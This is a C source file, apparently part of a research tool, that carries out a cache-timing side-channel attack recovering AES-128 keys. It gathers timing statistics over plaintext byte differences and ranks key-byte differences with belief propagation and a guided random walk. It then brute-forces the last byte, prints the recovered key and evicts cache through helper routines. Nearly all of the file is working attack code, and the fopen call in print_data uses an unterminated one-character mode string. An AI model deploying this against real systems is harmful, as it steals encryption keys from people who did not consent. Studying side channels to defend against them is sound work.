#define BELIEF_PROP_LIMIT 10
#define RANDOM_WALK_LIMIT 10




/*
 * Initialize timing data values to zeroes.
 */
void init_data(timing_data * data)
{

   data->total_num_timings = 0; 
   data->total_time = 0; 

   int i, j, k;

   for(i = 0; i < KEY_LENGTH; i++)
     for(j = 0; j < KEY_LENGTH; ++j)
       for(k = 0; k < 256; ++k){
	 data->time[i][j][k] = 0; 
	 data-> time_squared[i][j][k] = 0; 
	 data->num_timings[i][j][k] = 0; 
       }
}

/*
 * Begin guessing keys (only 256 possibilities).
 * Try all possible values for k[0]. For each one,
 * find the remainder of the final expanded key using
 * the guesses about the differences, then revert
 * this value to an original AES key. Test each possible
 * key by encrypting the zero block and comparing it to
 * to the known value.
 */
int guess_key(unsigned char * key_guess, timing_data * data, key_data * key)
{

  key_data candidate_key;
  unsigned char temp_key[KEY_LENGTH];
  unsigned char ciphertext[16];

  int i, j;

/*   printf("\nGuessing Key: "); */
/*        for(j = 0; j < 16; j++) */
/* 	printf("%02x", key_guess[j ]); */

  for(i = 0; i < 256; i ++)
    {
      temp_key[0] = i & 0xff;
      for(j = 1; j < KEY_LENGTH; j++)
	temp_key[j] = key_guess[j] ^ temp_key[0];


#ifdef DECRYPT_MODE
      for(j = 0; j < KEY_LENGTH; j++)
	candidate_key.key_byte[j] = temp_key[j];     
      AES_set_decrypt_key(candidate_key.key_byte,128, &candidate_key.expanded);
      decrypt(zero, ciphertext, &candidate_key);
#else
      revert_key(temp_key, candidate_key.key_byte);      
      AES_set_encrypt_key(candidate_key.key_byte,128, &candidate_key.expanded);
      encrypt(zero, ciphertext, &candidate_key);
#endif

      int foundMismatch = 0;

      for(j = 0; j < 16; j++)
	if(ciphertext[j] != key->encrypted_zero[j])
	  foundMismatch++;

      if(!foundMismatch)
	{

	  printf("\n\n######################");
	  printf("\nRECOVERED AES KEY:\n");

	  for(j = 0; j < KEY_LENGTH; j++)
	    printf("%02x ", candidate_key.key_byte[j]);
	  
	  printf("\n######################\n");
	  return 1;
	}
    }

  return 0;
}

void print_ranks(double guess_weights[KEY_LENGTH][256], key_data *
key)
{

  int i,j;

  double rank_total = 0;

  for(i = 1; i < KEY_LENGTH; ++i)
    {
      int rank = 1;
#ifdef SPARC      
      int right_diff = 
	(((unsigned char * )key->expanded.rd_key)[ 160 + i] ^ 
	 ((unsigned char * )key->expanded.rd_key)[160]) & 0xff;
#else     
      int right_diff = 
	(((unsigned char * )key->expanded.rd_key)[ 160 + (i ^ 3)] ^ 
	   ((unsigned char * )key->expanded.rd_key)[163]) & 0xff;
#endif

      for(j = 0; j < 256; ++j)
	if(guess_weights[i][j] < guess_weights[i][right_diff])
	  rank++;
      
      printf("%d,",rank);

      rank_total += rank;
    }

  rank_total = (rank_total - 0x808) / 0x7f8;

  printf(" [%.3f]", rank_total);

}

void normalize(double guess_prob[KEY_LENGTH][256])
{

  int i, j;

 for(i = 1; i < KEY_LENGTH; ++i)
      {
	double total = 0;
	for(j = 0; j < 256; ++j)
	  total += guess_prob[i][j];

	for(j = 0; j < 256; ++j)
	  guess_prob[i][j] /= total;
      }

}

/*
 * Belief propagation implementation
 */
int solve_diffs_BP(timing_data * data, double
diff_prob[KEY_LENGTH][KEY_LENGTH][256], key_data * key)
{

  int i, j, k, u, v;

  unsigned char key_guess[KEY_LENGTH];
  unsigned char new_key_guess[KEY_LENGTH];

  double guess_prob[KEY_LENGTH][256];
  double next_guess_prob[KEY_LENGTH][256];

  short diffcounts[256];

  int diffs_solved = 0;

  for(i = 1; i < KEY_LENGTH; i++){
    for(j = 0; j < 256; j++){
      guess_prob[i][j] = 0;

      guess_prob[i][j] += diff_prob[0][i][j];

      for(u = 1; u < i; ++u) {
	double high_prob = 0;
	for(v = 0; v < 256; v++)
	  if(diff_prob[0][u][v] + diff_prob[u][i][v ^ j] > high_prob)
	     high_prob = diff_prob[0][u][v] + diff_prob[u][i][v ^ j];
	
	guess_prob[i][j] += high_prob;
      }

      
      for(u = i + 1; u < KEY_LENGTH; ++u) {
	double high_prob = 0;
	for(v = 0; v < 256; v++)
	  if(diff_prob[0][u][v] + diff_prob[i][u][v ^ j] > high_prob)
	     high_prob = diff_prob[0][u][v] + diff_prob[i][u][v ^ j];
	
	guess_prob[i][j] += high_prob;
      }
    }
  }

  normalize(guess_prob);

    printf("\nBP:");
    print_ranks(guess_prob, key);

    //Make initial best guess
    for(i = 1; i < KEY_LENGTH; ++i)
      {
	double max_seen = 0;
	for(j = 0; j < 256; ++j)
	  if(guess_prob[i][j] >= max_seen)
	    {
	      max_seen =guess_prob[i][j];
	      key_guess[i] = j;
	    }
      }

    if(guess_key(key_guess, data, key))
    return 1;


  int round = 1;
/*   double guess_weight; */

  for(round = 0; round < RANDOM_WALK_LIMIT; round++){
    for(i = 1; i < KEY_LENGTH; i++)
      for(j = 0; j < 256; j++){
	next_guess_prob[i][j] = 0;


	for(u = 1; u < i; ++u) {
	       double high_prob = 0;
	       
	       for(v = 0; v < 256; v++)
		 if(guess_prob[u][v] * diff_prob[u][i][v ^ j] > high_prob)
		   high_prob = guess_prob[u][v] * diff_prob[u][i][v ^ j];
	     
	       next_guess_prob[i][j] += high_prob;
	}
      
	for(u = i + 1; u < KEY_LENGTH; ++u){
	  double high_prob = 0;
	
	  for(v = 0; v < 256; v++)
	    if(guess_prob[u][v] * diff_prob[i][u][v ^ j] > high_prob)
	      high_prob = guess_prob[u][v] * diff_prob[i][u][v ^ j];
	  
	     next_guess_prob[i][j] += high_prob;
	}

      }

  for(i = 1; i < KEY_LENGTH; i++)
      for(j = 0; j < 256; j++)
	guess_prob[i][j] = next_guess_prob[i][j];

  normalize(guess_prob);


/*     printf("\nRound #%d", round); */
/*      print_ranks(guess_prob, key); */

    for(i = 1; i < KEY_LENGTH; ++i)
      {
	double max_seen = 0;
	for(j = 0; j < 256; ++j)
	  if(guess_prob[i][j] >= max_seen)
	    {
	      max_seen =guess_prob[i][j];
	      key_guess[i] = j;
	    }
      }
  
    if(guess_key(key_guess, data, key))
    return 1;

  }

  return 0;
}


/*
 * "Guided" Random Walk implementation
 */
int solve_diffs_RW(timing_data * data, double
diff_weight[KEY_LENGTH][KEY_LENGTH][256], key_data * key)
{

  int i, j, k, u, v;

  unsigned char key_guess[KEY_LENGTH];
  unsigned char new_key_guess[KEY_LENGTH];

  double guess_weights[KEY_LENGTH][256];

  short diffcounts[256];

  int diffs_solved = 0;

  for(i = 1; i < KEY_LENGTH; i++){
    for(j = 0; j < 256; j++){
      guess_weights[i][j] = 0;

      guess_weights[i][j] += diff_weight[0][i][j];

      for(u = 1; u < i; ++u) {
	double low_weight = 10000;
	for(v = 0; v < 256; v++)
	  if(diff_weight[0][u][v] + diff_weight[u][i][v ^ j] < low_weight)
	    low_weight = diff_weight[0][u][v] + diff_weight[u][i][v ^ j];
	
	guess_weights[i][j] += low_weight;
      }

      
      for(u = i + 1; u < KEY_LENGTH; ++u) {
	double low_weight = 10000;
	for(v = 0; v < 256; v++)
	  if(diff_weight[0][u][v] + diff_weight[i][u][v ^ j] < low_weight)
	    low_weight = diff_weight[0][u][v] + diff_weight[i][u][v ^ j];
	
	guess_weights[i][j] += low_weight;
      }
    }
  }

    printf("\nRW:");
    print_ranks(guess_weights, key);

    //Make initial best guess
    for(i = 1; i < KEY_LENGTH; ++i)
      {
	double min_seen = guess_weights[i][0];
	for(j = 0; j < 256; ++j)
	  if(guess_weights[i][j] <= min_seen)
	    {
	      min_seen =guess_weights[i][j];
	      key_guess[i] = j;
	    }
      }

    if(guess_key(key_guess, data, key))
    return 1;


  int round = 1;
  double guess_weight;

  for(round = 0; round < RANDOM_WALK_LIMIT; round++){

    for(i =1; i < KEY_LENGTH; i++){
      for(j = 0; j < 256; j++){
	guess_weight = diff_weight[0][i][j];

	for(k = 1; k < i; k++)
	  guess_weight +=diff_weight[k][i][j ^ key_guess[k]];	

	for(k = i +1; k < KEY_LENGTH; k++)
	  guess_weight +=diff_weight[i][k][j ^ key_guess[k]];
	
	guess_weights[i][j] = guess_weight;
      }

    }

    int best_byte = 1;
    double best_gain =0;
    //Make single best guess
    for(i = 1; i < KEY_LENGTH; ++i)
      {
	double min_seen = guess_weights[i][0];
	for(j = 0; j < 256; ++j)
	  if(guess_weights[i][j] <= min_seen)
	    {
	      min_seen =guess_weights[i][j];
	    }

	if(guess_weights[i][key_guess[i]] - min_seen > best_gain)
	  {
	    best_gain = guess_weights[i][key_guess[i]] - min_seen;
	    best_byte = i;

	  }
      }
	
    double min_seen = guess_weights[best_byte][0];
    for(j = 0; j < 256; ++j)
      if(guess_weights[best_byte][j] <= min_seen)
	{
	      min_seen =guess_weights[best_byte][j];
	      key_guess[best_byte] = j;
	}

   /*  printf("\nUpdating byte #%d", best_byte); */

/*     printf("\nRound #%d", round); */
/*      print_ranks(guess_weights, key); */

    if(guess_key(key_guess, data, key))
      return 1;

  }


  return 0;
}

int check_data_RW(timing_data* data, key_data * key){
  
  int i, j, k;

  double min_time[KEY_LENGTH][KEY_LENGTH];
  double diff_weight[KEY_LENGTH][KEY_LENGTH][256];


  for(i = 0; i < KEY_LENGTH; ++i)
    for(j = i + 1; j < KEY_LENGTH; ++j){
      min_time[i][j] = data->time[i][j][0] / data->num_timings[i][j][0] ;
      for(k = 0; k < 256; ++k){ 
	data->mean[i][j][k] = data->time[i][j][k]/
	  data->num_timings[i][j][k];
     
	if(data->mean[i][j][k] < min_time[i][j])
	  min_time[i][j] = data->mean[i][j][k];
      }
    }


   for(i = 0; i < KEY_LENGTH; ++i)
    for(j = i + 1; j < KEY_LENGTH; ++j)
      for(k = 0; k < 256; ++k)
	{
#ifdef NONE_AES
	  //  if(i % 4 == j %4)
	  if(1)
	    diff_weight[i][j][k] = (min_time[i][j] - data->mean[i][j][k]) *
	      (min_time[i][j] - data->mean[i][j][k]);
	  else
	    diff_weight[i][j][k] =1;
#else
	  diff_weight[i][j][k] = (min_time[i][j] - data->mean[i][j][k]) *
	  (min_time[i][j] - data->mean[i][j][k]);
#endif
/* 	  if(i + j < 2)  */
/* 	  printf("\nCalculating weight[%d][%d][%d]: %.5f - %.5f = %.5f", i,  */
/* 		 j, k, data->mean[i][j][k], min_time[i][j], diff_weight[i][j][k]); */ 
	}
	 


/*    printf("\n\nMin. Time: %.5f", min_time[0][1]); */
/*    for(k = 0; k < 256; ++k) */
/*      printf("\n[%d][%d] = %02x: time %.5f, weight %.5f", 0, 1, k, */
/* 	    data->mean[0][1][k], diff_weight[0][1][k]); */
/*    printf("\n\nMin. Time: %.5f", min_time[0][1]); */




   return solve_diffs_RW(data, diff_weight, key); 
}

int check_data_BP(timing_data* data, key_data * key){
  
  int i, j, k;

  double min_time[KEY_LENGTH][KEY_LENGTH];
  double diff_prob[KEY_LENGTH][KEY_LENGTH][256];

  double taverage = data->total_time/ data->total_num_timings;

  for(i = 0; i < KEY_LENGTH; i++)
    for(j = i + 1; j < KEY_LENGTH; j++){

      double sum  = 0;
      for(k = 0; k < 256; ++k){
	data->mean[i][j][k] = data->time[i][j][k]/ data->num_timings[i][j][k];
	data->variance[i][j][k] = data->time_squared[i][j][k]/ 
	data->num_timings[i][j][k];	  
	data->variance[i][j][k]-= data->mean[i][j][k] * data->mean[i][j][k];	
	data->variance[i][j][k] = sqrt(data->variance[i][j][k]);

	diff_prob[i][j][k] =  exp(- pow(((data->mean[i][j][k] - taverage) /
				       data->variance[i][j][k]), 2));

	if(data->mean[i][j][k] - taverage < 1)
	  diff_prob[i][j][k] = 1 / diff_prob[i][j][k] ;

	sum += diff_prob[i][j][k];
      }
            
      //normalize
      for(k = 0; k < 256; ++k)
	diff_prob[i][j][k] /= sum;
    }

   return solve_diffs_BP(data, diff_prob, key); 
}




/*
 * Record the timing data for one trial. This gets recorded in the
 * table in many places. 
 */
void record_timing(timing_data * data, timing_pair * pair)
{
  int i, j;

  data->total_num_timings += 1; 
  data->total_time  += pair->time; 

  //i_prime and j_prime are used to fix endianness difference

  for(i = 0; i < 16; i++)
    for(j = i + 1; j < 16; ++j){
      short index = (pair->value[i] ^ pair->value[j]) & 0xff;
      
      data->time[i][j][index] += pair->time;
      data-> time_squared[i][j][index] += pair->time * pair->time;  
      data->num_timings[i][j][index] += 1;  
      }
}

void print_data(timing_data * data, char * filename)
{
  int i, j, k;
  int b;
  double taverage;
  char open_type = 'w';

  FILE * out = fopen(filename, &open_type);

  if(out == NULL){
    printf("\nCould not open file: %s", filename);
    return;
  }


  taverage = data->total_time/ data->total_num_timings;


  for(i = 0; i < KEY_LENGTH; i++)
    for(j = i + 1; j < KEY_LENGTH; j++)
      for(k = 0; k < 256; ++k){
      data->mean[i][j][k] = data->time[i][j][k]/ data->num_timings[i][j][k];
      data->variance[i][j][k] = data->time_squared[i][j][k]/ 
	data->num_timings[i][j][k];	  
      data->variance[i][j][k]-= data->mean[i][j][k] * data->mean[i][j][k];	
      data->variance[i][j][k] = sqrt(data->variance[i][j][k]);


      fprintf(out, "K[%d] ^ K [%d] = %02x:  %lld %.5f %.5f %.5f\n"
	      ,i, j ,k
	     ,data->num_timings[i][j][k]
	     ,data->mean[i][j][k]	   
	      ,data->mean[i][j][k] - taverage
	     ,data->variance[i][j][k]
	     );
      }

   fflush(out);
   fclose(out);
}


int check_data(timing_data* data, key_data * key){
  
  
  int BP_success = check_data_BP(data, key);
  int RW_success= check_data_RW(data, key);
  
  if(BP_success ||RW_success){

    if(BP_success)
      printf(" (Belief Propagation) ");
    else	 
      printf(" (Random Walk) ");

    return 1;
  }

  return 0;
}


void cache_evict()
{
#ifdef NONE_AES
  w_cache_evict();
#elif defined(DECRYPT_MODE)
  dhs_cache_evict();
  #else
  hs_cache_evict();
  #endif
}
